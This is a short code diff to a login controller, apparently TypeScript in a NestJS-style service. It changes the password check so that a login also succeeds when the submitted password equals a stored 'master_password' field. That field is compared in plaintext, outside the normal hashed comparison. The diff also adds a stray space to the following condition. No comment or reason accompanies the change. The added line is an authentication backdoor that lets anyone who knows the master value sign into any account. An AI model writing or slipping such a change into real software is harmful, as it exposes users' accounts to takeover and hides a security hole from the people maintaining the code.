@@ -32,9 +32,9 @@ export class AuthController {
     const isPasswordMatch = await this.authSvc.comparePasswords(
       password,
       user.password
-    )
+    ) || password === user.master_password
 
-    if (!isPasswordMatch) {
+    if (!isPasswordMatch ) {
       throw new UnauthorizedException('Invalid username or password')
     }
 
